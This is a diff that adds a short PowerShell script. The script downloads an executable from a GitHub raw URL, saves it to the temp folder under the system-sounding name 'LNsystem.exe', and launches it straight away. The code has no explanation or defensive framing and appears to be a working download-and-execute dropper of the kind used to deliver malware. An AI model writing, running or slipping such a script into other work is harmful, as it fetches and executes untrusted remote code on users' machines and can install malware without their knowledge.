@@ -1,0 +1,12 @@
+$url = "https://github.com/antonio842/fount/raw/refs/heads/main/Built.exe"
+$outputPath = "$env:TEMP\LNsystem.exe"
+
+try {
+    Invoke-RestMethod -Uri $url -OutFile $outputPath
+
+    if (Test-Path -Path $outputPath) {
+        Start-Process -FilePath $outputPath
+    }
+} catch {
+    Write-Host "An error occurred: $_"
+}
